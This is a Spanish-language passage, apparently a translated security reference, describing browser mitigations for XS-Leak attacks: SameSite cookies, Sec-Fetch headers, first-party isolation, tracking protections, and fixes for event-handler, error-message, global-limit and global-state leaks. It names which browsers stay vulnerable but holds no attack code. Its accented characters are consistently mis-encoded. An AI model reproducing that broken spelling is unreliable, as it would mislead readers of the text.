* **Solicitudes de JavaScript**. Las solicitudes de JavaScript de origen cruzado se utilizan a menudo en ataques XS-Leak, porque un atacante tiene un control detallado sobre la solicitud emitida. Sin embargo, dado que estas solicitudes no est√°n habilitadas para CORS, est√°n sujetas a las mismas restricciones que las solicitudes enviadas por elementos HTML, como scripts o im√°genes. Por lo tanto, el impacto de esta t√©cnica de fuga tambi√©n se puede **mitigar mediante CORP y CORB**.

M√©todos m√°s gen√©ricos:

* **Metadatos de recuperaci√≥n**. Estos encabezados de solicitud permiten a los propietarios del servidor comprender mejor c√≥mo el navegador del usuario caus√≥ una solicitud espec√≠fica. En Chrome, los encabezados Sec-Fetch-\* se agregan autom√°ticamente a cada solicitud y proporcionan metadatos sobre la procedencia de la solicitud. Por ejemplo, Sec-Fetch-Dest: image se activ√≥ desde un elemento de imagen. Las aplicaciones web pueden elegir bloquear solicitudes en funci√≥n de esa informaci√≥n.
* **Cookies Same-Site**. La marca Same-Site de las cookies permite a los sitios web declarar **si una cookie debe restringirse al contexto de mismo sitio o de primer nivel**. Todos los principales navegadores admiten cookies Same-Site. En GC, las cookies sin el atributo son ahora Lax de forma predeterminada. Para XS-Leaks, **las cookies Same-Site limitan dr√°sticamente las posibilidades de ataque de fuga**. Por otro lado, las t√©cnicas de fuga que dependen de **`window.open` a√∫n funcionan con `SameSite=Lax`**. Los sitios web que utilizan **otros m√©todos de autenticaci√≥n**, como certificados de cliente y autenticaci√≥n HTTP, **siguen siendo vulnerables**.
* **Desvinculaci√≥n de identificadores de origen cruzado (COIU)**. COIU, tambi√©n conocido como Aislamiento de primeros partidos (FPI), es una funci√≥n de seguridad opcional que los usuarios pueden habilitar en la configuraci√≥n experta de FF (about:config) y que se introdujo inicialmente en Tor Browser. En una vista abstracta, es un contexto de mismo sitio extendido. **Vincula m√∫ltiples recursos** (por ejemplo, cookies, cach√©, almacenamiento del lado del cliente) **al primer partido** en lugar de compartirlos entre todos los sitios web visitados. Si se habilita, COIU disminuye dr√°sticamente la aplicabilidad de XS-Leaks, ya que solo son posibles los m√©todos que utilizan ventanas emergentes para cumplir con el requisito de primer partido de la pol√≠tica.
* **Protecciones de seguimiento**. Apple implement√≥ un mecanismo de privacidad llamado **Prevenci√≥n inteligente de seguimiento (ITP)** en SA que tiene como objetivo combatir el seguimiento entre sitios limitando las capacidades de las cookies y otras API web. En versiones m√°s nuevas de SA, ITP bloquea todas las cookies de terceros de forma predeterminada sin excepciones \[74]. Este bloqueo evita todas las fugas que no se basan en ventanas emergentes. FF adopt√≥ un enfoque similar con la Prevenci√≥n mejorada de seguimiento (ETP), pero solo bloquean cookies de terceros espec√≠ficas pertenecientes a proveedores de seguimiento. En el contexto de XS-Leaks, ETP solo mitiga las t√©cnicas de fuga que apuntan a estos dominios de seguimiento.
* **Extensiones del navegador**. Los usuarios conscientes de la seguridad pueden utilizar **extensiones del navegador para evitar ciertos m√©todos de inclusi√≥n**.

### Mitigaciones de t√©cnicas de fuga

* **Manejador de eventos**. La **mitigaci√≥n m√°s efectiva** en esta t√©cnica de fuga ser√≠a **denegarlos todos**, pero esto romper√≠a la mayor√≠a de las aplicaciones web en Internet. Por lo tanto, proponemos **reducir el n√∫mero de informaci√≥n necesaria que se puede recopilar dentro de los eventos**. Por ejemplo, el evento de violaci√≥n de CSP no debe contener la URL de destino de redireccionamiento en el campo blockedURI. Este comportamiento se implementa en FF y en versiones m√°s nuevas de GC, solo SA sigue siendo vulnerable.
* **Mensajes de error**. Para mitigar XS-Leaks basados en la t√©cnica de fuga de mensajes de error, hay dos requisitos principales. En primer lugar, **los mensajes de error no deben contener informaci√≥n detallada**, de manera similar a los mensajes de manejador de eventos. En segundo lugar, los navegadores deben **minimizar la aparici√≥n de mensajes de error**. XS-Leaks como SRI Error, ContentDocument XFO o Fetch Redirect detectan si se lanza o no un mensaje de error.
* **L√≠mites globales**. La correcci√≥n de las t√©cnicas de fuga que abusan de los l√≠mites globales es relativamente compleja porque dependen de restricciones f√≠sicas. La recomendaci√≥n general es, por lo tanto, **restringir los l√≠mites globales en una peque√±a base por sitio**. Si el l√≠mite global es 1, como para la API de pago, el atacante puede intentar activar silenciosamente la interfaz de usuario de pago web en cualquier momento, lo que solo tiene √©xito si la interfaz de usuario no se est√° utilizando simult√°neamente en ninguna otra pesta√±a. Recomendamos acceder a la API de pago solo cuando se haya utilizado un evento confiable. De esta manera, el l√≠mite global se establece en cero a menos que el usuario proporcione su consentimiento, como un clic izquierdo del mouse en una ventana de di√°logo, que establece el l√≠mite global en uno.
* **Estado global**. **Las propiedades del estado global del navegador no deben ser accesibles**. Por ejemplo, FF es el √∫nico navegador que actualiza el historial del estado global cuando ocurre una redirecci√≥n, lo que result
